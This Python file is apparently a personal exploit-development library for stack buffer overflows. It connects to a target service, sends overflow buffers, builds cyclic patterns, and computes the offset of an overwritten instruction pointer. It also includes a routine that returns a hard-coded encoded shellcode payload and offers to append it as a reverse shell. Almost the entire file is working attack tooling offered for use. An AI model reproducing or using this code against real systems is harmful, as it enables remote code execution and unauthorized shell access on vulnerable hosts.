import os
import struct
os.system('color')
import time


class JihadLibrary(object):
    def ip(self):
        return input(colors.BOLD +"What is the ip address(192.168.1.54): " + colors.END) or "192.168.1.54"
    def port(self):
        return int(input(colors.BOLD +"What is the the port(9999) : " + colors.END) or "9999")

    def copyRight(self):
        print(colors.HEADER + """"
            ____   __ __       ____  ____  __ __   ____  ___          ___  _           _____  ____  __ __    ___  ___   
            |    \ |  |  |     |    ||    ||  |  | /    ||   \        /  _]| |         / ___/ /    ||  |  |  /  _]|   \  
            |  o  )|  |  |     |__  | |  | |  |  ||  o  ||    \      /  [_ | |        (   \_ |  o  ||  |  | /  [_ |    \ 
            |     ||  ~  |     __|  | |  | |  _  ||     ||  D  |    |    _]| |___      \__  ||     ||  ~  ||    _]|  D  |
            |  O  ||___, |    /  |  | |  | |  |  ||  _  ||     |    |   [_ |     |     /  \ ||  _  ||___, ||   [_ |     |
            |     ||     |    \  `  | |  | |  |  ||  |  ||     |    |     ||     |     \    ||  |  ||     ||     ||     |
            |_____||____/      \____||____||__|__||__|__||_____|    |_____||_____|      \___||__|__||____/ |_____||_____|
            look at www.neetechs.com for more script
            """ + colors.END)
    def connectToSocket(self,socket, ip, port, s=None):
        if s is None:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            s = s
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #s.send(bytes(buffer + b"\r\n", "latin-1"))
        s.connect((ip, port))
        #s.bind((ip, port))
        print(colors.OkGreen + ip + ":" + str(port) + " has been connected" + colors.END)
        return s
    
    def receiveFromSocket(self,s):
        import time
        print(colors.WARNING + "Received: " + colors.END)
        s.setblocking(1)	
        data = s.recv(1024)
        data = data.decode()
        print(f"{colors.OkCyan}       {data} {colors.END}")
        time.sleep(0.5)
        

    def sendToSocket(self,s,message):
        #s.send(message)
        isString = isinstance(message, str)
        if isString:
            print("converting payload to binary")
            s.sendall(message.encode('ascii') )
            print(colors.OkGreen + "This message:" + message + "\n has been send successfully" + colors.END)

        else:
            s.send(message)

        #s.sendall(message)
    # Create Pattern
    def createPattern(self,length):
        from string import ascii_uppercase, ascii_lowercase, digits

        pattern = ""
        for upper in ascii_uppercase:
            for lower in ascii_lowercase:
                for digit in digits:
                    if len(pattern) < length:
                        pattern += upper + lower + digit

                    else:
                        out = pattern[:length]
                        return out

        # If we end up here we've exhausted all characters so truncate the pattern
        #return pattern[:length]
        return pattern
    
    def randomCharacters(self,y):
        import random
        import string
        return ''.join(random.choice(string.ascii_letters) for x in range(y))
    # Offset Pattern
    def offsetPattern(self, payload, totalCharacter):
        from string import ascii_uppercase, ascii_lowercase, digits

        #IP = input("enter the EIP(0x1234567A): ") or "0x31704330"
        eIP = input("enter the EIP(1234567A): ") or "31704330"
        print(eIP)
        needle = eIP

        try:
            #if needle.startswith("0x"):
            if needle.startswith(""):
                # Strip off '0x', convert to ASCII and reverse
                needle = needle[2:]
                needle = bytearray.fromhex(needle).decode("ascii")
                needle = needle[::-1]
                #return needle
        except (ValueError, TypeError) as e:
            print(e)
            raise

        haystack = ""
        for upper in ascii_uppercase:
            for lower in ascii_lowercase:
                for digit in digits:
                    haystack += upper + lower + digit
                    found_at = haystack.find(needle)
                    if found_at > -1:
                        return found_at
    
    def generatePayload(self):
        # get input
        payload = "This should be the random characters"
        character = input("what is the character(random): ") or self.randomCharacters(1)
        totalCharacter = int(input("What is the number of character(9999) : ") or "9999")
        payload = (character * totalCharacter)
        
        return payload, totalCharacter
    def generateRandomPayload(self):
        # get input
        payload = "This should be the random characters"
        character = input("what is the character(random): ") or self.randomCharacters(1)
        totalCharacter = int(input("What is the number of character(9999) : ") or "9999")
        payload = JihadLibrary().createPattern(totalCharacter) 
        
               
        return payload, totalCharacter

    def generateMessage(self,payload):
        payload = input(colors.WARNING + "What is your message(default:anonymessage): " + colors.END) or "anonymessage"
        return payload
    
    def addReverseShell(self, payload, reverseShell = None):
        addShell = input(colors.WARNING + "do you want to add reverse shell(y or n)(default:n): " + colors.END) or "n"
        if addShell == "y":
            if reverseShell:
                pass
            else:
                payload = payload.encode('ascii')
                reverseShell = self.generateReverseShell()
                
                payload += reverseShell
                print(bytes(payload))
        # future update in sha allah
        return payload
    
    def listeningToPort(self,s):
        # client example
        
        while True:
            time.sleep(5)
            data = s.recv(512)
            if data.lower() == 'q':
                s.close()
                break

            print("RECEIVED: %s" % data)
            data = input("SEND( TYPE q or Q to Quit):")
            s.send(data)
            if data.lower() == 'q':
                s.close()
                break

    def generateReverseShell(self):
        buf =  b""
        buf += b"\xbd\x65\x6e\xfd\x0b\xda\xd2\xd9\x74\x24\xf4\x58"
        buf += b"\x29\xc9\xb1\x52\x31\x68\x12\x83\xe8\xfc\x03\x0d"
        buf += b"\x60\x1f\xfe\x31\x94\x5d\x01\xc9\x65\x02\x8b\x2c"
        buf += b"\x54\x02\xef\x25\xc7\xb2\x7b\x6b\xe4\x39\x29\x9f"
        buf += b"\x7f\x4f\xe6\x90\xc8\xfa\xd0\x9f\xc9\x57\x20\xbe"
        buf += b"\x49\xaa\x75\x60\x73\x65\x88\x61\xb4\x98\x61\x33"
        buf += b"\x6d\xd6\xd4\xa3\x1a\xa2\xe4\x48\x50\x22\x6d\xad"
        buf += b"\x21\x45\x5c\x60\x39\x1c\x7e\x83\xee\x14\x37\x9b"
        buf += b"\xf3\x11\x81\x10\xc7\xee\x10\xf0\x19\x0e\xbe\x3d"
        buf += b"\x96\xfd\xbe\x7a\x11\x1e\xb5\x72\x61\xa3\xce\x41"
        buf += b"\x1b\x7f\x5a\x51\xbb\xf4\xfc\xbd\x3d\xd8\x9b\x36"
        buf += b"\x31\x95\xe8\x10\x56\x28\x3c\x2b\x62\xa1\xc3\xfb"
        buf += b"\xe2\xf1\xe7\xdf\xaf\xa2\x86\x46\x0a\x04\xb6\x98"
        buf += b"\xf5\xf9\x12\xd3\x18\xed\x2e\xbe\x74\xc2\x02\x40"
        buf += b"\x85\x4c\x14\x33\xb7\xd3\x8e\xdb\xfb\x9c\x08\x1c"
        buf += b"\xfb\xb6\xed\xb2\x02\x39\x0e\x9b\xc0\x6d\x5e\xb3"
        buf += b"\xe1\x0d\x35\x43\x0d\xd8\x9a\x13\xa1\xb3\x5a\xc3"
        buf += b"\x01\x64\x33\x09\x8e\x5b\x23\x32\x44\xf4\xce\xc9"
        buf += b"\x0f\x3b\xa6\xd0\xdb\xd3\xb5\xd2\xfd\x42\x33\x34"
        buf += b"\x6b\x95\x15\xef\x04\x0c\x3c\x7b\xb4\xd1\xea\x06"
        buf += b"\xf6\x5a\x19\xf7\xb9\xaa\x54\xeb\x2e\x5b\x23\x51"
        buf += b"\xf8\x64\x99\xfd\x66\xf6\x46\xfd\xe1\xeb\xd0\xaa"
        buf += b"\xa6\xda\x28\x3e\x5b\x44\x83\x5c\xa6\x10\xec\xe4"
        buf += b"\x7d\xe1\xf3\xe5\xf0\x5d\xd0\xf5\xcc\x5e\x5c\xa1"
        buf += b"\x80\x08\x0a\x1f\x67\xe3\xfc\xc9\x31\x58\x57\x9d"
        buf += b"\xc4\x92\x68\xdb\xc8\xfe\x1e\x03\x78\x57\x67\x3c"
        buf += b"\xb5\x3f\x6f\x45\xab\xdf\x90\x9c\x6f\xef\xda\xbc"
        buf += b"\xc6\x78\x83\x55\x5b\xe5\x34\x80\x98\x10\xb7\x20"
        buf += b"\x61\xe7\xa7\x41\x64\xa3\x6f\xba\x14\xbc\x05\xbc"
        buf += b"\x8b\xbd\x0f"
        return (buf)
class colors:
    HEADER = '\033[95m'
    OkBlue = '\033[94m'
    OkCyan = '\033[96m'
    OkGreen = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
